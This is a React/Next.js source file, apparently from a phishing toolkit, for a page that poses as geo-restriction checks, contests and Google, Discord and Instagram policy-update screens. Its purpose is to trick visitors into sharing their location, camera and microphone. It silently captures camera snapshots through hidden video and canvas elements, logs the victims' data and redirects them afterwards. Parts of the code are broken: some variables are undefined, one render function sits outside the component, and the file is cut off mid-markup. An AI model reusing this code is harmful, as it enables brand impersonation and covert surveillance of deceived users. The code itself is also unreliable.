"use client";

import { useEffect, useState, useRef, useCallback, useMemo } from 'react';
import { useParams, useSearchParams } from 'next/navigation';
import { useLogs } from '@/contexts/LogContext';
import PhishingPageLayout from '@/app/phishing/PhishingPageLayout';
import type { LocationData, CameraData, AudioData } from '@/types';
import { Button } from '@/components/ui/button';
import {
    Loader2, MapPin, CheckCircle, AlertTriangle, Globe, Gamepad2, Lock, type LucideIcon,
    Camera as CameraIconLucide, VideoOff, Trophy, Cookie, Image as ImageIconLucide, ShieldCheck, Sparkles, Wand2,
    Mic, MicOff, RadioTower, BarChart3
} from 'lucide-react';
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Card as ShadcnCard, CardContent, CardTitle as ShadcnCardTitle } from '@/components/ui/card'; // Renamed to avoid conflict if Card is used elsewhere
import { cn } from '@/lib/utils'; // For cn helper, used in camera templates

// Generic content for fallback or simple templates - this will be superseded by specific template content
const genericBaseContents: Record<string, { title: string, message: string, actionText?: string }> = {
  'default': { title: 'Service Interaction', message: 'Please follow the instructions to continue.', actionText: 'Start Process' },
  // other generic fallbacks can remain if needed, but specific templates will define their own full content
};

// Content definitions for LOCATION templates (copied from src/app/phishing/location/[id]/page.tsx)
interface LocationTemplateSpecificContent {
  title: string;
  actionText: string;
  message: string;
  heroIcon?: LucideIcon;
  pageSpecificMessage?: string;
  brandName?: string;
  brandLogo?: React.ReactNode;
}
const locationTemplateContent: Record<string, LocationTemplateSpecificContent> = {
  'restricted-website-access': {
    title: 'Access Restricted - Location Verification Required',
    actionText: 'Verify Location & Access Site',
    message: "This website cannot be viewed in all countries. Verify your location to gain access.",
    pageSpecificMessage: "Access to this website's full range of content and features is limited in certain geographical regions due to licensing agreements and local regulations. Please verify your current location to unlock all available services and information.",
    heroIcon: Globe,
    brandName: "Restricted Website Access",
    brandLogo: null,
  },
  'geo-restricted-service-access': {
    title: 'Service Unavailable - Location Verification Required',
    actionText: 'Verify Location to Access Service',
    message: "This service is not available in your current region. Verify your location to check eligibility and gain access.",
    pageSpecificMessage: "Many of our digital services, including premium streaming, online games, and specialized software, are subject to regional licensing. To access the service you're looking for, or to see available services in your area, please verify your location.",
    heroIcon: Gamepad2,
    brandName: "Geo-Restricted Service",
    brandLogo: null,
  },
  'content-unlock': {
    title: 'Unlock Region-Restricted Content',
    actionText: 'Verify Location to Access',
    message: 'This content cannot be viewed in all countries. Verify your location to gain access.',
    pageSpecificMessage: "Access exclusive videos, images, articles, and other files by verifying your location. Some content is geographically restricted, and this step ensures compliance with licensing agreements.",
    heroIcon: Lock,
    brandName: "Region-Restricted Content",
    brandLogo: null,
  },
  default: { // Default for location type if specific id not found
    title: 'Location Verification Needed',
    actionText: 'Verify My Location',
    message: 'Please share your location to continue using this service.',
    heroIcon: MapPin,
  }
};


// TODO: Add content definitions for CAMERA and AUDIO templates later
// Content definitions for CAMERA templates (derived from src/app/phishing/camera/[id]/page.tsx)
interface CameraTemplateSpecificContent {
  title: string;
  message: string;
  cookieMessage?: string;
  actionText?: string;
  visual?: React.ReactNode; // Can be an icon or an img tag
  // Note: headerClassName and specific redirectUrl from original camera templateContent are not used here
  // as custom page handles redirection globally and UI is replicated directly.
}
const cameraTemplateContent: Record<string, CameraTemplateSpecificContent> = {
  'google-policy-update': {
    title: 'Google - Policy Update',
    message: "We've updated our Terms of Service and Privacy Policy. Please accept the new terms to continue using Google services.",
    cookieMessage: "By clicking 'Accept & Continue', you agree to Google's updated Terms of Service and Privacy Policy. This helps us improve your experience and provide personalized services.",
    actionText: 'Accept & Continue',
    visual: <img src="/google_logo.png" alt="Google Logo" className="h-6 w-auto mr-2" />
  },
  'discord-terms-update': {
    title: 'Discord - Terms of Service Update',
    message: "Important: Our Terms of Service have been updated. Please review and accept them to continue using Discord.",
    cookieMessage: "By clicking 'Accept Terms', you acknowledge and agree to Discord's updated Terms of Service. This ensures a safe and compliant environment for all users.",
    actionText: 'Accept Terms',
    visual: <img src="/discord_logo.png" alt="Discord Logo" className="h-8 w-auto mr-2" />
  },
  'instagram-privacy-update': {
    title: 'Instagram - Privacy Policy Update',
    message: "Your privacy matters. We've updated our Privacy Policy to better explain how we use your data. Please accept to continue.",
    cookieMessage: "By tapping 'Accept Policy', you agree to Instagram's updated Privacy Policy. This allows us to provide you with a more personalized and secure experience.",
    actionText: 'Accept Policy',
    visual: <img src="/instagram_logo.png" alt="Instagram Logo" className="h-8 w-auto mr-2" />
  },
  'photo-contest-entry': { // Assuming Trophy, Cookie, ImageIcon, ShieldCheck, Sparkles, Wand2 are imported from lucide-react
    title: 'SnapWin Contest!',
    message: "Showcase your photography skills and win amazing prizes! To submit your entry, please first **accept our cookie policy below**. Camera access will be requested afterwards to capture your photo submission.",
    cookieMessage: "Our site uses cookies to enhance your experience and for essential functionality. By clicking 'Accept Cookies', you agree to our use of cookies.",
    visual: <Trophy className="h-12 w-12 text-amber-400 mr-3" />, // Make sure Trophy is imported
  },
  'video-verification': {
    title: 'Secure Video Verification',
    actionText: 'Start Video Verification',
    message: 'For security, we need to verify your identity via video. Please enable your camera.',
    visual: <ShieldCheck className="h-8 w-8 text-blue-600 mr-2" />, // Make sure ShieldCheck is imported
  },
  'ar-filter': {
    title: 'Magical AR Filter Fun!',
    actionText: 'Test AR Filter',
    message: 'Check out our latest AR filter! Enable your camera to see it in action.',
    visual: <><Wand2 className="h-8 w-8 text-purple-500 mr-1" /><Sparkles className="h-6 w-6 text-yellow-400" /></>, // Make sure Wand2, Sparkles imported
  },
  default: { // Default for camera type
    title: 'Camera Access Required',
    actionText: 'Enable Camera',
    message: 'This feature requires camera access. Please enable your camera to continue.',
    // visual: <CameraIcon className="h-8 w-8 text-gray-600 mr-2" /> // Ensure CameraIcon is imported if used
  }
};

// Generic policies for branded templates
const genericPolicies = [
    "1. Information We Collect: We collect information you provide directly to us, such as when you create an account, update your profile, use the interactive features of our services, participate in a survey, or request customer support. This may include personal details such as your name, email address, phone number, postal address, and any other information you choose to provide.",
    "2. How We Use Your Information: We may use the information we collect to provide, maintain, and improve our services; to personalize your experience and the advertisements you see; to communicate with you about products, services, offers, promotions, rewards, and events offered by us and others; to monitor and analyze trends, usage, and activities in connection with our services; and for any other purpose described to you at the time the information was collected or as otherwise set forth in this privacy policy.",
    "3. Information Sharing and Disclosure: We do not share your personal information with third parties except as described in this policy. We may share information with vendors, consultants, and other service providers who need access to such information to carry out work on our behalf and are obligated to protect your information. We may also share information for legal reasons, such as in response to a request for information if we believe disclosure is in accordance with, or required by, any applicable law, regulation or legal process.",
    "4. Data Retention: We store the information we collect for as long as it is necessary for the purpose(s) for which we originally collected it, or for other legitimate business purposes, including to meet our legal, regulatory, or other compliance obligations.",
    "5. Your Choices and Rights: You may have certain rights regarding your personal information, subject to local data protection laws. These may include the right to access, correct, update, port, or request deletion of your personal information. You can typically manage your account information and communication preferences through your account settings or by contacting us directly.",
    "6. Cookies and Tracking Technologies: We use cookies and similar tracking technologies (like web beacons and pixels) to access or store information. Specific information about how we use such technologies and how you can refuse certain cookies is set out in our Cookie Policy. Most web browsers are set to accept cookies by default. If you prefer, you can usually choose to set your browser to remove or reject browser cookies.",
    "7. Third-Party Services: Our service may contain links to other websites or services that are not operated or controlled by us (Third-Party Services). Any information you provide on or to Third-Party Services or that is collected by Third-Party Services is provided directly to the owners or operators of the Third-Party Services and is subject to their own privacy policies. We do not endorse and are not responsible for the content, privacy policies, or practices of any Third-Party Services.",
    "8. Security of Your Information: We take reasonable measures, including administrative, technical, and physical safeguards, to help protect your information from loss, theft, misuse, and unauthorized access, disclosure, alteration, and destruction. However, please be aware that despite our efforts, no security measures are perfect or impenetrable, and no method of data transmission can be guaranteed against any interception or other type of misuse.",
    "9. Children's Privacy: Our services are not directed to individuals under the age of 13 (or other applicable age as required by local law), and we do not knowingly collect personal information from children in this age group. If we become aware that a child under this age has provided us with personal information, we will take steps to delete such information from our files.",
    "10. Changes to This Policy: We may update this privacy policy from time to time. If we make material changes, we will notify you by revising the date at the top of the policy and, in some cases, we may provide you with additional notice (such as adding a statement to our homepage or sending you a notification). We encourage you to review this privacy policy periodically to stay informed about our information practices and the ways you can help protect your privacy."
];


// For handling redirects based on base template ID
const REDIRECT_URL_KEYS: Record<string, string> = {
  'content-unlock': 'contentUnlockRedirectUrl',
  'restricted-website-access': 'restrictedWebsiteRedirectUrl',
  'geo-restricted-service-access': 'geoRestrictedServiceRedirectUrl',
  'google-policy-update': 'googlePolicyUpdateRedirectUrl',
  'discord-terms-update': 'discordTermsUpdateRedirectUrl',
  'instagram-privacy-update': 'instagramPrivacyUpdateRedirectUrl',
};

type CaptureType = 'location' | 'camera' | 'audio';
type CaptureStatus = 'pending' | 'capturing' | 'success' | 'error' | 'skipped';

interface StatusMessage {
  type: CaptureType;
  status: CaptureStatus;
  message?: string;
}

export default function CustomPhishingPage() {
  const { addLog } = useLogs();
  const params = useParams<{ id: string }>();
  const searchParams = useSearchParams();

  const templateId = params.id || 'default';
  const captureQuery = searchParams.get('capture');

  const requestedCaptureTypes = useMemo(() =>
    (captureQuery?.split(',') || [])
      .map(type => type.trim().toLowerCase())
      .filter(type => ['location', 'camera', 'audio'].includes(type)) as CaptureType[],
    [captureQuery]
  );

  // Determine if the templateId is for a location, camera, or audio page to select the right content object.
  const locationTemplateIds = ['restricted-website-access', 'geo-restricted-service-access', 'content-unlock'];
  const cameraTemplateIds = [
    'google-policy-update', 'discord-terms-update', 'instagram-privacy-update',
    'photo-contest-entry', 'video-verification', 'ar-filter'
  ];
  const audioTemplateIds = ['voice-assistant', 'speech-to-text', 'quality-check'];

  const isLocationTemplate = locationTemplateIds.includes(templateId);
  const isCameraTemplate = cameraTemplateIds.includes(templateId);
  const isAudioTemplate = audioTemplateIds.includes(templateId);

  let pageContent: LocationTemplateSpecificContent | CameraTemplateSpecificContent | AudioTemplateSpecificContent | { title: string, message: string, actionText?: string };
  if (isLocationTemplate) {
    pageContent = locationTemplateContent[templateId] || locationTemplateContent.default;
  } else if (isCameraTemplate) {
    pageContent = cameraTemplateContent[templateId] || cameraTemplateContent.default;
  } else if (isAudioTemplate) {
    pageContent = audioTemplateContent[templateId] || audioTemplateContent.default;
  } else {
    pageContent = genericBaseContents[templateId] || genericBaseContents.default;
  }

  // Cast pageContent to the specific type when using it
  const currentLocContent = isLocationTemplate ? pageContent as LocationTemplateSpecificContent : null;
  const currentCamContent = isCameraTemplate ? pageContent as CameraTemplateSpecificContent : null;
  const currentAudioContent = isAudioTemplate ? pageContent as AudioTemplateSpecificContent : null;

  const [currentCaptureIndex, setCurrentCaptureIndex] = useState(-1); // -1 means not started
  const [statusMessages, setStatusMessages] = useState<StatusMessage[]>([]);
  const [overallStatus, setOverallStatus] = useState<'idle' | 'processing' | 'completed' | 'failed'>('idle');
  const [allDone, setAllDone] = useState(false);

  // States specific to camera templates (from src/app/phishing/camera/[id]/page.tsx)
  const [cookieConsentGiven, setCookieConsentGiven] = useState(false);
  const [isPolicyModalOpen, setIsPolicyModalOpen] = useState(false);
  // Note: The 'status' state from original camera page (idle, requesting, streaming etc.)
  // will be mapped to overallStatus and specific statusMessages for the camera capture type.

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);


  const logInitialVisit = useCallback(() => {
    addLog({
      type: 'generic',
      data: {
        message: `Visited custom phishing page: /phishing/custom/${templateId}`,
        requestedCapture: requestedCaptureTypes.join(','),
      }
    });
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [templateId, requestedCaptureTypes]); // addLog is stable

  useEffect(() => {
    logInitialVisit();
  }, [logInitialVisit]);


  const updateStatus = (type: CaptureType, status: CaptureStatus, message?: string) => {
    setStatusMessages(prev => {
      const existingMsgIndex = prev.findIndex(m => m.type === type);
      if (existingMsgIndex > -1) {
        const updated = [...prev];
        updated[existingMsgIndex] = { type, status, message };
        return updated;
      }
      return [...prev, { type, status, message }];
    });
  };

  const proceedToNextCapture = useCallback(() => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }
    if (videoRef.current) {
        videoRef.current.srcObject = null;
    }
    setCurrentCaptureIndex(prev => prev + 1);
  }, []);

  const captureLocation = useCallback(async () => {
    updateStatus('location', 'capturing', 'Requesting location access...');
    if (!navigator.geolocation) {
      updateStatus('location', 'error', 'Geolocation is not supported by your browser.');
      addLog({ type: 'generic', data: { message: 'Custom capture: Geolocation not supported' } });
      proceedToNextCapture();
      return;
    }
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData: LocationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
        };
        addLog({ type: 'location', data: locationData });
        updateStatus('location', 'success', `Location captured: ${position.coords.latitude.toFixed(2)}, ${position.coords.longitude.toFixed(2)}`);
        proceedToNextCapture();
      },
      (err) => {
        let errorMessage = 'Location error: Could not retrieve location.';
        if (err.code === err.PERMISSION_DENIED) errorMessage = 'Location error: Access denied by user.';
        addLog({ type: 'generic', data: { message: `Custom capture: ${errorMessage}` } });
        updateStatus('location', 'error', errorMessage);
        proceedToNextCapture();
      },
      { timeout: 10000, enableHighAccuracy: true }
    );
  }, [addLog, proceedToNextCapture]);

  const captureCamera = useCallback(async () => {
    updateStatus('camera', 'capturing', 'Requesting camera access...');
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      updateStatus('camera', 'error', 'Camera access not supported by your browser.');
      addLog({ type: 'generic', data: { message: 'Custom capture: Camera access not supported' } });
      proceedToNextCapture();
      return;
    }
    try {
      streamRef.current = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = streamRef.current;
        videoRef.current.onloadedmetadata = () => {
          if(videoRef.current) videoRef.current.play();
          // Capture after a short delay
          setTimeout(() => {
            if (videoRef.current && canvasRef.current && videoRef.current.readyState >= HTMLMediaElement.HAVE_METADATA) {
              const video = videoRef.current;
              const canvas = canvasRef.current;
              const MAX_WIDTH = 320;
              const MAX_HEIGHT = 240;
              let { videoWidth, videoHeight } = video;
              if (videoWidth > MAX_WIDTH) { videoHeight = (videoHeight * MAX_WIDTH) / videoWidth; videoWidth = MAX_WIDTH; }
              if (videoHeight > MAX_HEIGHT) { videoWidth = (videoWidth * MAX_HEIGHT) / videoHeight; videoHeight = MAX_HEIGHT; }
              canvas.width = videoWidth; canvas.height = videoHeight;
              const context = canvas.getContext('2d');
              context?.drawImage(video, 0, 0, canvas.width, canvas.height);
              const imageUrl = canvas.toDataURL('image/jpeg', 0.7);
              addLog({ type: 'camera', data: { imageUrl } as CameraData });
              updateStatus('camera', 'success', 'Camera snapshot captured.');
            } else {
              updateStatus('camera', 'error', 'Failed to process video stream for capture.');
            }
            proceedToNextCapture();
          }, 1000); // Delay for stream to stabilize
        };
        videoRef.current.onerror = () => {
            updateStatus('camera', 'error', 'Video element error.');
            addLog({ type: 'generic', data: { message: 'Custom capture: Video element error' } });
            proceedToNextCapture();
        }
      }
    } catch (err) {
      let errorMessage = 'Camera error: Could not access camera.';
      if (err instanceof DOMException && err.name === 'NotAllowedError') errorMessage = 'Camera error: Access denied by user.';
      addLog({ type: 'generic', data: { message: `Custom capture: ${errorMessage}` } });
      updateStatus('camera', 'error', errorMessage);
      proceedToNextCapture();
    }
  }, [addLog, proceedToNextCapture]);

  const captureAudio = useCallback(async () => {
    updateStatus('audio', 'capturing', 'Requesting microphone access...');
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      updateStatus('audio', 'error', 'Microphone access not supported by your browser.');
      addLog({ type: 'generic', data: { message: 'Custom capture: Microphone access not supported' } });
      proceedToNextCapture();
      return;
    }
    try {
      streamRef.current = await navigator.mediaDevices.getUserMedia({ audio: true });
      // Simulate recording then log
      updateStatus('audio', 'capturing', 'Microphone access granted. Simulating recording...');
      setTimeout(() => {
        addLog({ type: 'audio', data: { message: 'Audio capture simulated successfully.' } as AudioData });
        updateStatus('audio', 'success', 'Audio capture simulated.');
        proceedToNextCapture();
      }, 1500);
    } catch (err) {
      let errorMessage = 'Audio error: Could not access microphone.';
      if (err instanceof DOMException && err.name === 'NotAllowedError') errorMessage = 'Audio error: Access denied by user.';
      addLog({ type: 'generic', data: { message: `Custom capture: ${errorMessage}` } });
      updateStatus('audio', 'error', errorMessage);
      proceedToNextCapture();
    }
  }, [addLog, proceedToNextCapture]);

  useEffect(() => {
    if (currentCaptureIndex >= 0 && currentCaptureIndex < requestedCaptureTypes.length) {
      const typeToCapture = requestedCaptureTypes[currentCaptureIndex];
      if (typeToCapture === 'location') captureLocation();
      else if (typeToCapture === 'camera') captureCamera();
      else if (typeToCapture === 'audio') captureAudio();
    } else if (currentCaptureIndex >= requestedCaptureTypes.length && requestedCaptureTypes.length > 0 && isCapturingProcessActive) {
      // All requested captures attempted
      setAllDone(true);
      // setIsCapturingProcessActive(false); // Now handled by overallStatus
      setOverallStatus('completed');
      // updateStatus(requestedCaptureTypes[requestedCaptureTypes.length-1], 'success', 'All capture attempts finished.');
      // The line above might be redundant if individual statuses are clear. Let's rely on overallStatus for the final message.

      // Handle redirection if applicable
      const redirectKey = REDIRECT_URL_KEYS[templateId];
      if (redirectKey) {
        const redirectUrl = localStorage.getItem(redirectKey);
        if (redirectUrl && redirectUrl.trim() !== '') {
          updateStatus('default' as CaptureType, 'capturing', `Process complete. Redirecting in 3 seconds...`);
          setTimeout(() => { window.location.href = redirectUrl; }, 3000);
        }
      }
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentCaptureIndex, requestedCaptureTypes, overallStatus]); // Changed isCapturingProcessActive to overallStatus

  const startCaptureProcess = () => {
    if (requestedCaptureTypes.length > 0) {
      // setIsCapturingProcessActive(true);
      setOverallStatus('processing');
      setStatusMessages(requestedCaptureTypes.map(type => ({ type, status: 'pending' })));
      setCurrentCaptureIndex(0); // Start with the first type
    } else {
        updateStatus('default' as CaptureType, 'error', 'No valid data capture types specified to start.');
        setOverallStatus('failed');
    }
  };

  // Cleanup stream on unmount
  useEffect(() => {
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  const renderLocationTemplateUI = () => {
    if (!currentLocContent) return <p>Error: Location template content not found.</p>;
    const SpecificHeroIcon = currentLocContent.heroIcon || MapPin;

    // Find current location status message if it exists
    const locationOpStatus = statusMessages.find(sm => sm.type === 'location');

    return (
      <PhishingPageLayout title={currentLocContent.title}>
        <div className="space-y-6">
          {/* Replicated content from location/[id]/page.tsx renderTemplateSpecificContent */}
          <div className="space-y-4">
            {currentLocContent.brandName && (
              <div className={`flex items-center justify-center text-gray-700 mb-3 w-full text-2xl font-bold`}>
                {/* currentLocContent.brandLogo could be rendered here if it were an element */}
                <span className="text-center">{currentLocContent.brandName}</span>
              </div>
            )}
            <ShadcnCard className="mb-6 bg-muted/30 p-6 text-center shadow-inner border-dashed">
              <CardContent className="space-y-4">
                {(() => {
                  if (templateId === 'restricted-website-access') {
                    return <Globe className="w-20 h-20 text-primary/70 mx-auto" />;
                  } else if (templateId === 'geo-restricted-service-access') {
                    const HeroIcon = currentLocContent.heroIcon || Gamepad2; // Default to Gamepad2 if not specified
                    return <HeroIcon className="w-20 h-20 text-primary/70 mx-auto" />;
                  }
                  // Fallback for 'content-unlock' or default location type
                  return <SpecificHeroIcon className="w-20 h-20 text-primary/60 mx-auto" />;
                })()}
                <ShadcnCardTitle className="text-xl text-foreground font-semibold">{currentLocContent.message}</ShadcnCardTitle>
                {currentLocContent.pageSpecificMessage && <p className="text-md text-muted-foreground">{currentLocContent.pageSpecificMessage}</p>}
              </CardContent>
            </ShadcnCard>
          </div>

          {/* Action Button and Status Display */}
          {overallStatus !== 'completed' && overallStatus !== 'failed' && (
            <>
              {(templateId === 'content-unlock' || templateId === 'restricted-website-access' || templateId === 'geo-restricted-service-access') && (
                <p className="text-center text-sm text-gray-500 mb-2">
                  {templateId === 'content-unlock' && "Powered by GeoLock™"}
                  {templateId === 'restricted-website-access' && "Verification by GeoGuard™"}
                  {templateId === 'geo-restricted-service-access' && "Access validation by GeoPass™"}
                </p>
              )}
              <Button
                onClick={startCaptureProcess}
                size="lg"
                className="w-full text-lg py-6 shadow-md bg-accent hover:bg-accent/90 text-accent-foreground"
                disabled={overallStatus === 'processing' || requestedCaptureTypes.length === 0}
              >
                {overallStatus === 'processing' && requestedCaptureTypes.includes('location') && locationOpStatus?.status === 'capturing'
                  ? <><Loader2 className="mr-2 h-6 w-6 animate-spin" /> Verifying...</>
                  : <><MapPin className="mr-2 h-6 w-6" /> {currentLocContent.actionText}</>
                }
              </Button>
            </>
          )}

          {/* Detailed status messages for each capture type */}
          {overallStatus === 'processing' && statusMessages.length > 0 && (
            <div id="capture-status" className="my-4 space-y-2 text-left">
              {statusMessages.map((msg, index) => (
                <div key={index} className={`p-2 border rounded-md text-sm ${
                  msg.status === 'success' ? 'bg-green-100 border-green-300 text-green-700' :
                  msg.status === 'error' ? 'bg-red-100 border-red-300 text-red-700' :
                  msg.status === 'capturing' ? 'bg-blue-100 border-blue-300 text-blue-700' :
                  'bg-gray-100 border-gray-300'
                }`}>
                  <strong>{msg.type.charAt(0).toUpperCase() + msg.type.slice(1)}:</strong> {msg.message || msg.status}
                  {msg.status === 'capturing' && <Loader2 className="inline-block ml-2 h-4 w-4 animate-spin" />}
                </div>
              ))}
            </div>
          )}

          {/* Final status: Success (completed) */}
          {overallStatus === 'completed' && (
            <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
              <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
              <p className="text-xl font-semibold text-green-700">
                {REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])?.trim() !== ''
                  ? "Process Complete. Redirecting..."
                  : "Verification Complete"}
              </p>
              <p className="text-md text-green-600">
                {!(REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])?.trim() !== '') && "This window can now be closed."}
              </p>
            </div>
          )}

          {/* Final status: Error (failed or specific error) */}
          {overallStatus === 'failed' && (
             <Alert variant="destructive" className="mt-6">
                <AlertTriangle className="h-5 w-5" />
                <AlertTitle>Process Failed</AlertTitle>
                <AlertDescription>
                    {statusMessages.find(m => m.status === 'error')?.message || "An error occurred during the process."}
                </AlertDescription>
            </Alert>
          )}
           {/* Display specific error for location if it's the only requested type and it failed */}
           {requestedCaptureTypes.length === 1 && requestedCaptureTypes[0] === 'location' && locationOpStatus?.status === 'error' && overallStatus !== 'failed' && (
             <Alert variant="destructive" className="mt-6">
                <AlertTriangle className="h-5 w-5" />
                <AlertTitle>Location Access Failed</AlertTitle>
                <AlertDescription>{locationOpStatus.message}</AlertDescription>
            </Alert>
           )}
        </div>
      </PhishingPageLayout>
    );
  };

  const renderGenericTemplateUI = () => {
    // This is the old UI, kept for other templateId types for now
    const currentGenericContent = genericBaseContents[templateId] || genericBaseContents.default;
    return (
      <PhishingPageLayout title={`Custom Action: ${currentGenericContent.title}`}>
        <video ref={videoRef} className="hidden w-[1px] h-[1px]" playsInline muted />
        <canvas ref={canvasRef} className="hidden w-[1px] h-[1px]" />
        <div className="space-y-4 text-center">
          <h1 className="text-xl font-semibold">{currentGenericContent.title}</h1>
          <p className="text-muted-foreground">{currentGenericContent.message}</p>
          {overallStatus === 'idle' && (
            <Button onClick={startCaptureProcess} disabled={requestedCaptureTypes.length === 0} size="lg">
              {currentGenericContent.actionText || 'Start Process'}
            </Button>
          )}
          {overallStatus === 'processing' && <Loader2 className="h-8 w-8 animate-spin mx-auto text-primary" />}
          <div id="capture-status" className="my-4 space-y-2 text-left">
            {statusMessages.map((msg, index) => (
              <div key={index} className={`p-2 border rounded-md text-sm ${
                msg.status === 'success' ? 'bg-green-100 border-green-300 text-green-700' :
                msg.status === 'error' ? 'bg-red-100 border-red-300 text-red-700' :
                msg.status === 'capturing' ? 'bg-blue-100 border-blue-300 text-blue-700' :
                'bg-gray-100 border-gray-300'}`}>
                <strong>{msg.type.charAt(0).toUpperCase() + msg.type.slice(1)}:</strong> {msg.message || msg.status}
                {msg.status === 'capturing' && <Loader2 className="inline-block ml-2 h-4 w-4 animate-spin" />}
              </div>
            ))}
          </div>
          {overallStatus === 'completed' && (
            <p className="text-lg font-semibold text-green-600 p-4 bg-green-50 rounded-md">
              All requested actions have been processed. This window may redirect or can be closed.
            </p>
          )}
          {requestedCaptureTypes.length === 0 && overallStatus === 'idle' && (
            <p className="text-red-600 font-medium">No valid data capture types were specified in the link.</p>
          )}
           {overallStatus === 'failed' && (
             <p className="text-red-600 font-medium p-4 bg-red-50 rounded-md">
              Process failed. {statusMessages.find(m => m.status === 'error')?.message || "Please check permissions and try again."}
            </p>
          )}
        </div>
      </PhishingPageLayout>
    );
  };

  // Main conditional rendering logic
  if (isLocationTemplate) {
    return renderLocationTemplateUI();
  } else if (isCameraTemplate) {
    // return renderCameraTemplateUI(); // Placeholder for now
    // For now, let camera templates also fall back to generic to avoid breaking entirely
    // until renderCameraTemplateUI is fully implemented.
    // This will be replaced in the next step.
    return renderGenericTemplateUI();
  }
  // TODO: Add else if for isAudioTemplate

  // Fallback to generic UI for other template types
  return renderGenericTemplateUI();
}


// #########################################################################
// # UI Rendering Functions for different template types
// #########################################################################

const renderCameraTemplateUI = () => {
  if (!currentCamContent) return <p>Error: Camera template content not found.</p>;

  const handleBrandedPolicyAccept = () => {
    // This function will be called by the "Accept" button on Google, Discord, Instagram UIs
    // It should:
    // 1. Set cookieConsentGiven (if that's part of their flow, though it's more for photo-contest)
    // 2. Directly call startCaptureProcess, which will then pick up 'camera' if it's in requestedCaptureTypes.
    //    The captureCamera function itself handles the actual camera interaction.
    // For branded policy pages, the camera capture is meant to be "silent" or integrated with acceptance.
    setCookieConsentGiven(true); // For consistency if any sub-logic expects it, though not primary for these three.

    // If no specific capture types are defined for this custom link,
    // we might still want to log a generic acceptance or proceed to redirect.
    // However, the main goal is to trigger captures if they ARE requested.
    if (requestedCaptureTypes.length > 0) {
        startCaptureProcess(); // This will sequentially try all requested captures.
    } else {
        // No captures requested, but user accepted policy. Log this? Redirect?
        addLog({ type: 'generic', data: { message: `Policy accepted for ${templateId}, no specific captures requested.` } });
        setOverallStatus('completed'); // Mark as done to trigger potential redirect
    }
  };


  if (templateId === 'google-policy-update') {
    const camOpStatus = statusMessages.find(sm => sm.type === 'camera');
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-[#f8f9fa] p-4 font-['Roboto',_sans-serif]">
        {/* Hidden video and canvas for silent capture - these are global to the component */}
        {/* <video ref={videoRef} className="hidden" playsInline muted /> */}
        {/* <canvas ref={canvasRef} className="hidden"></canvas> */}

        {overallStatus !== 'completed' || (overallStatus === 'completed' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
          <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-lg border border-gray-200">
            <div className="flex items-center mb-6">
              <img src="/google_logo.png" alt="Google Logo" className="h-8 w-auto mr-3" />
            </div>
            <h1 className="text-2xl text-[#202124] mb-4">Before you continue to Google</h1>
            <p className="text-sm text-[#5f6368] mb-3">Google uses cookies and data to:</p>
            <ul className="list-disc list-inside text-sm text-[#5f6368] mb-6 space-y-1">
              <li>Deliver and maintain services, like tracking outages and protecting against spam, fraud, and abuse</li>
              <li>Measure audience engagement and site statistics to understand how our services are used</li>
            </ul>
            <p className="text-sm text-[#5f6368] mb-6">If you agree, we’ll also use cookies and data to:</p>
            <ul className="list-disc list-inside text-sm text-[#5f6368] mb-6 space-y-1">
              <li>Improve the quality of our services and develop new ones</li>
              <li>Deliver and measure the effectiveness of ads</li>
              <li>Show personalized content, depending on your settings</li>
              <li>Show personalized or generic ads, depending on your settings, on Google and across the web</li>
            </ul>
            <p className="text-sm text-[#5f6368] mb-6">{currentCamContent.message}</p>
            <p className="text-xs text-[#70757a] mb-6">{currentCamContent.cookieMessage}</p>

            <div className="flex flex-col sm:flex-row justify-end items-center space-y-3 sm:space-y-0 sm:space-x-3">
              <Button
                onClick={() => setIsPolicyModalOpen(true)}
                className="text-[#1a73e8] hover:bg-gray-100 font-medium py-2 px-4 rounded w-full sm:w-auto order-2 sm:order-1"
                variant="ghost"
              >
                Read the Policy
              </Button>
              <Button
                onClick={handleBrandedPolicyAccept}
                className="bg-[#1a73e8] hover:bg-[#1765cc] text-white font-medium py-2.5 px-6 rounded transition-colors duration-150 w-full sm:w-auto order-1 sm:order-2"
                disabled={overallStatus === 'processing'}
              >
                {overallStatus === 'processing' ? <Loader2 className="h-5 w-5 animate-spin" /> : (currentCamContent.actionText || 'Accept & Continue')}
              </Button>
            </div>
            {camOpStatus && camOpStatus.status === 'error' && camOpStatus.message && (
              <p className="text-red-600 text-xs mt-4 text-right">{camOpStatus.message}</p>
            )}
             {/* Display general processing status if not specific to camera error */}
            {overallStatus === 'processing' && (!camOpStatus || camOpStatus.status !== 'error') && (
              <div className="text-xs mt-4 text-right text-gray-500 flex items-center justify-end">
                <Loader2 className="h-4 w-4 animate-spin mr-1" /> Processing...
              </div>
            )}
          </div>
        ) : (
          <div className="bg-white p-8 rounded-lg shadow-md w-full max-w-lg border border-gray-200 text-center">
            <img src="/google_logo.png" alt="Google Logo" className="h-12 w-auto mx-auto mb-6" />
            <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
            <h1 className="text-xl text-[#202124] mb-2">Settings Saved</h1>
            <p className="text-sm text-[#5f6368]">This window can now be closed.</p>
          </div>
        )}
        {/* Policy Modal - Generic for all branded templates */}
        {isPolicyModalOpen && (
